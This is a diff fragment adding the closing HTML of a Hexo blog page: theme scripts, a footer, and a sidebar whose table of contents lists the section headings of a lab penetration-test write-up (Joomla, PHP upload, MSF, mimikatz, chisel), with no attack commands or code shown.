+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/20/Vulnstack2/" rel="prev" title="红日靶场2-vulnstack2">
+      <i class="fa fa-chevron-left"></i> 红日靶场2-vulnstack2
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="nav-text">前言：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%96%E7%BD%91"><span class="nav-text">外网</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E5%A4%96%E7%BD%91IP%E7%AB%AF%E5%8F%A3"><span class="nav-text">扫描外网IP端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%AB%E7%9B%AE%E5%BD%95"><span class="nav-text">扫目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%BEjoomla%E7%9A%84%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E"><span class="nav-text">找joomla的历史漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B7%BB%E5%8A%A0%E8%B4%A6%E5%8F%B7"><span class="nav-text">数据库添加账号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%A0php%E6%9C%A8%E9%A9%AC"><span class="nav-text">传php木马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95dis-func"><span class="nav-text">绕dis_func</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NPS"><span class="nav-text">NPS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF"><span class="nav-text">MSF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%B9%E4%B8%AAshell"><span class="nav-text">弹个shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="nav-text">添加路由</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%88%86%E7%A0%B4"><span class="nav-text">爆破</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#psexec"><span class="nav-text">psexec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mimikatz-kiwi"><span class="nav-text">mimikatz(kiwi)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#chisel-socks5%E4%BB%A3%E7%90%86"><span class="nav-text">chisel(socks5代理)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#wmiexec"><span class="nav-text">wmiexec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#smbclient"><span class="nav-text">smbclient</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">apsry</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">apsry</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
